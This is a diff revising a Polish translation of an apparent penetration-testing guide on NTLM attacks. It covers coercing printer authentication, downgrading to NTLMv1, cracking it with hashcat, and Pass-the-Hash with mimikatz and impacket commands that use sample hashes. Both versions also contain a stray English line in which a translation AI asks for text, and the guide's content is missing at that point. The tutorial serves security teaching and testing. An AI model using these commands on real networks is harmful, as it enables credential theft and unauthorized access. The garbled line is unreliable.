@@ -4,7 +4,7 @@
 
 ## Podstawowe informacje
 
-W środowiskach, w których działają **Windows XP i Server 2003**, wykorzystywane są hashe LM (Lan Manager), chociaż powszechnie wiadomo, że mogą być łatwo kompromitowane. Szczególny hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje na sytuację, w której LM nie jest używane, reprezentując hash dla pustego ciągu.
+W środowiskach, w których działają **Windows XP i Server 2003**, wykorzystywane są hashe LM (Lan Manager), chociaż powszechnie wiadomo, że można je łatwo skompromitować. Szczególny hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje na sytuację, w której LM nie jest używane, reprezentując hash dla pustego ciągu.
 
 Domyślnie protokół uwierzytelniania **Kerberos** jest główną metodą używaną. NTLM (NT LAN Manager) wkracza w określonych okolicznościach: brak Active Directory, nieistnienie domeny, awaria Kerberos z powodu niewłaściwej konfiguracji lub gdy próby połączenia są podejmowane za pomocą adresu IP zamiast ważnej nazwy hosta.
 
@@ -15,7 +15,7 @@ Wsparcie dla protokołów uwierzytelniania - LM, NTLMv1 i NTLMv2 - jest zapewnia
 **Kluczowe punkty**:
 
 - Hashe LM są podatne, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza jego brak użycia.
-- Kerberos jest domyślną metodą uwierzytelniania, a NTLM używane jest tylko w określonych warunkach.
+- Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używane tylko w określonych warunkach.
 - Pakiety uwierzytelniania NTLM są identyfikowalne po nagłówku "NTLMSSP".
 - Protokół LM, NTLMv1 i NTLMv2 są wspierane przez plik systemowy `msv1\_0.dll`.
 
@@ -79,13 +79,13 @@ Obecnie coraz rzadziej spotyka się środowiska z skonfigurowaną Nieograniczon�
 
 Możesz nadużyć niektóre dane uwierzytelniające/sesje, które już masz w AD, aby **poprosić drukarkę o uwierzytelnienie** przeciwko jakiemuś **hostowi pod twoją kontrolą**. Następnie, używając `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić wyzwanie uwierzytelniające na 1122334455667788**, przechwycić próbę uwierzytelnienia, a jeśli została wykonana przy użyciu **NTLMv1**, będziesz mógł ją **złamać**.\
 Jeśli używasz `responder`, możesz spróbować \*\*użyć flagi `--lm` \*\* aby spróbować **obniżyć** **uwierzytelnienie**.\
-_&#x4E;ote, że dla tej techniki uwierzytelnienie musi być wykonane przy użyciu NTLMv1 (NTLMv2 nie jest ważny)._
+_Należy pamiętać, że dla tej techniki uwierzytelnienie musi być wykonane przy użyciu NTLMv1 (NTLMv2 nie jest ważne)._
 
-Pamiętaj, że drukarka będzie używać konta komputera podczas uwierzytelnienia, a konta komputerów używają **długich i losowych haseł**, których **prawdopodobnie nie będziesz w stanie złamać** używając powszechnych **słowników**. Ale **uwierzytelnienie NTLMv1** **używa DES** ([więcej informacji tutaj](#ntlmv1-challenge)), więc korzystając z niektórych usług specjalnie dedykowanych do łamania DES, będziesz w stanie je złamać (możesz użyć [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com) na przykład).
+Pamiętaj, że drukarka będzie używać konta komputera podczas uwierzytelnienia, a konta komputerów używają **długich i losowych haseł**, których **prawdopodobnie nie będziesz w stanie złamać** przy użyciu powszechnych **słowników**. Ale **uwierzytelnienie NTLMv1** **używa DES** ([więcej informacji tutaj](#ntlmv1-challenge)), więc korzystając z niektórych usług specjalnie dedykowanych do łamania DES, będziesz w stanie je złamać (możesz użyć [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com) na przykład).
 
 ### Atak NTLMv1 z hashcat
 
-NTLMv1 można również złamać za pomocą narzędzia NTLMv1 Multi [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), które formatuje wiadomości NTLMv1 w sposób, który można złamać za pomocą hashcat.
+NTLMv1 można również złamać za pomocą narzędzia NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), które formatuje wiadomości NTLMv1 w sposób, który można złamać za pomocą hashcat.
 
 Polecenie
 ```bash
@@ -126,7 +126,7 @@ Uruchom hashcat (najlepiej w trybie rozproszonym za pomocą narzędzia takiego j
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-W tym przypadku znamy hasło, które to hasło, więc oszukamy na potrzeby demonstracyjne:
+W tym przypadku znamy hasło, które to hasło, więc dla celów demonstracyjnych oszukamy:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -143,7 +143,7 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-It seems that you haven't provided the text you want translated. Please share the relevant English text, and I'll be happy to translate it to Polish for you.
+I'm sorry, but I need the specific text you would like me to translate. Please provide the content you want translated to Polish.
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
@@ -155,7 +155,7 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
 ### NTLMv2 Challenge
 
-Długość **wyzwania wynosi 8 bajtów** i **wysyłane są 2 odpowiedzi**: jedna ma długość **24 bajtów**, a długość **drugiej** jest **zmienna**.
+Długość **wyzwania wynosi 8 bajtów** i **wysyłane są 2 odpowiedzi**: jedna ma **24 bajty** długości, a długość **drugiej** jest **zmienna**.
 
 **Pierwsza odpowiedź** jest tworzona przez szyfrowanie za pomocą **HMAC_MD5** ciągu składającego się z **klienta i domeny** i używając jako **klucza** hasha **MD4** z **NT hasha**. Następnie **wynik** będzie użyty jako **klucz** do szyfrowania za pomocą **HMAC_MD5** **wyzwania**. Do tego **zostanie dodane wyzwanie klienta o długości 8 bajtów**. Łącznie: 24 B.
 
@@ -168,7 +168,7 @@ Jeśli masz **pcap, który uchwycił udany proces uwierzytelniania**, możesz sk
 **Gdy masz hash ofiary**, możesz go użyć do **podszywania się** pod nią.\
 Musisz użyć **narzędzia**, które **wykona** **uwierzytelnianie NTLM** przy użyciu tego **hasha**, **lub** możesz stworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, tak aby przy każdym **wykonaniu uwierzytelnienia NTLM** ten **hash był używany.** Ostatnia opcja to to, co robi mimikatz.
 
-**Pamiętaj, że możesz również przeprowadzać ataki Pass-the-Hash przy użyciu kont komputerowych.**
+**Pamiętaj, że możesz również przeprowadzać ataki Pass-the-Hash używając kont komputerowych.**
 
 ### **Mimikatz**
 
@@ -176,7 +176,7 @@ Musisz użyć **narzędzia**, które **wykona** **uwierzytelnianie NTLM** przy u
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-To uruchomi proces, który będzie należał do użytkowników, którzy uruchomili mimikatz, ale wewnętrznie w LSASS zapisane poświadczenia to te w parametrach mimikatz. Następnie możesz uzyskać dostęp do zasobów sieciowych, jakbyś był tym użytkownikiem (podobnie jak sztuczka `runas /netonly`, ale nie musisz znać hasła w postaci czystego tekstu).
+To uruchomi proces, który będzie należał do użytkowników, którzy uruchomili mimikatz, ale wewnętrznie w LSASS zapisane poświadczenia to te w parametrach mimikatz. Następnie możesz uzyskać dostęp do zasobów sieciowych, jakbyś był tym użytkownikiem (podobnie jak sztuczka `runas /netonly`, ale nie musisz znać hasła w postaci jawnej).
 
 ### Pass-the-Hash z linuxa
 
@@ -189,7 +189,7 @@ Możesz pobrać [binarne pliki impacket dla Windows tutaj](https://github.com/ro
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-- **atexec.exe** (W tym przypadku musisz określić polecenie, cmd.exe i powershell.exe nie są ważne, aby uzyskać interaktywną powłokę)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+- **atexec.exe** (W tym przypadku musisz określić polecenie, cmd.exe i powershell.exe nie są ważne do uzyskania interaktywnej powłoki)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
 - Istnieje jeszcze kilka innych binarnych plików Impacket...
 
 ### Invoke-TheHash
